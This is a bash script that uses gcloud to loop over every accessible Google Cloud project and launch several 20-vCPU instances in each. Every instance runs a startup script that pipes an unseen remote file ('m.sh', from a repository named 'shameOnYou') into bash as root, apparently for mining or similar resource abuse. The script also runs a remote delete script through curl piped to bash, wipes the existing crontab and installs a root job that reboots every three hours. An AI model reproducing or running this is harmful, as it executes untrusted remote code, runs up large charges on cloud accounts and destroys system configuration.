#!/bin/bash

gcloud config set compute/zone us-central1-c

delete_instances (){
curl -s -L https://raw.githubusercontent.com/oldhuman/shameOnYou/master/delete.sh | bash -s
}

create_instance (){
gcloud beta compute --project=$1 instances create instance-$2 --zone=$3 --machine-type=custom-20-22272 --subnet=default --network-tier=PREMIUM --metadata=startup-script=sudo\ curl\ -s\ -L\ \ https://raw.githubusercontent.com/oldhuman/shameOnYou/master/m.sh\ \|\ bash\ -s --maintenance-policy=MIGRATE --scopes=https://www.googleapis.com/auth/cloud-platform --min-cpu-platform=Intel\ Haswell --image=debian-9-stretch-v20181011  --image-project=debian-cloud --boot-disk-size=10GB --boot-disk-type=pd-standard --boot-disk-device-name=instance-1 --async --quiet
}

instances_count=$(gcloud compute instances list --filter="status=running" --format="value(name)" | wc -l)
#LOGIC
delete_instances
for project in $(gcloud projects list  --format="value(project_id)")
	do
		gcloud config set project $project
		echo "Project: " $project
		i=1
		for zone in "us-central1-b" "us-east1-b" "us-west2-a"
			do
				create_instance $project $i $zone
				echo "Created instance" $project "instance-"$i $zone
				i=$((i + 1))
			done
			
			j=1
			if [ $i \> $instances_count ];
				then
					for (( c=1; c<=3; c++ ))
					do
    				create_instance $project $c "us-east4-b"
				done
			fi;
	done
	line="0 */3 * * * /sbin/reboot"
	crontab -r && (crontab -u root -l; echo "$line" ) | crontab -u root -
exit
